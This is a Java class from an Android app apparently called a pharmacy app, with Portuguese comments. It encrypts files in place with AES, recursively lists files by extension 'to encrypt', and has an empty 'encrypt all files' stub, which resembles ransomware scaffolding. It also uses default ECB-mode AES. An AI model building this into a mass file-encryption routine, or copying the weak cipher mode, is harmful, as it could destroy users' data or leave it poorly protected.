package com.example.farmacia_app;

import android.content.Context;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import java.io.*;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class CryptoManager {
    private static final String ALGORITHM = "AES";

    public CryptoManager(Context context) {
    }

    // Gera uma chave secreta AES
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(256, new SecureRandom());
        return keyGen.generateKey();
    }

    // Codifica a chave para Base64
    public static String encodeKey(SecretKey key) {
        return Base64.encodeToString(key.getEncoded(), Base64.NO_WRAP);
    }

    // Decodifica a chave a partir de Base64
    public static SecretKey decodeKey(String base64Key) {
        byte[] decodedKey = Base64.decode(base64Key, Base64.NO_WRAP);
        return new SecretKeySpec(decodedKey, 0, decodedKey.length, ALGORITHM);
    }

    // Criptografa um arquivo
    public static void encryptFile(String filePath, SecretKey key) throws Exception {
        File inputFile = new File(filePath);
        byte[] inputBytes = readFileBytes(inputFile);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] outputBytes = cipher.doFinal(inputBytes);

        writeFileBytes(inputFile, outputBytes);
        Log.d("Crypto", "Arquivo criptografado: " + filePath);
    }

    // Descriptografa um arquivo
    public static void decryptFile(String filePath, SecretKey key) throws Exception {
        File inputFile = new File(filePath);
        byte[] inputBytes = readFileBytes(inputFile);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, key);
        byte[] outputBytes = cipher.doFinal(inputBytes);

        writeFileBytes(inputFile, outputBytes);
        Log.d("Crypto", "Arquivo descriptografado: " + filePath);
    }

    // Lista arquivos com extensões específicas
    public static List<File> listarArquivosParaCriptografar(File dir, List<String> extensoes) {
        List<File> arquivos = new ArrayList<>();
        listarRecursivo(dir, extensoes, arquivos);
        return arquivos;
    }

    private static void listarRecursivo(File dir, List<String> extensoes, List<File> arquivos) {
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (f.isDirectory()) {
                listarRecursivo(f, extensoes, arquivos);
            } else {
                for (String ext : extensoes) {
                    if (f.getName().toLowerCase().endsWith(ext)) {
                        arquivos.add(f);
                    }
                }
            }
        }
    }

    // Leitura segura de arquivo
    private static byte[] readFileBytes(File file) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (InputStream is = new FileInputStream(file)) {
            byte[] data = new byte[1024];
            int n;
            while ((n = is.read(data)) != -1) {
                buffer.write(data, 0, n);
            }
        }
        return buffer.toByteArray();
    }

    // Escrita segura de arquivo
    private static void writeFileBytes(File file, byte[] data) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
        }
    }

    public void criptografarTodosArquivos() {
    }
}
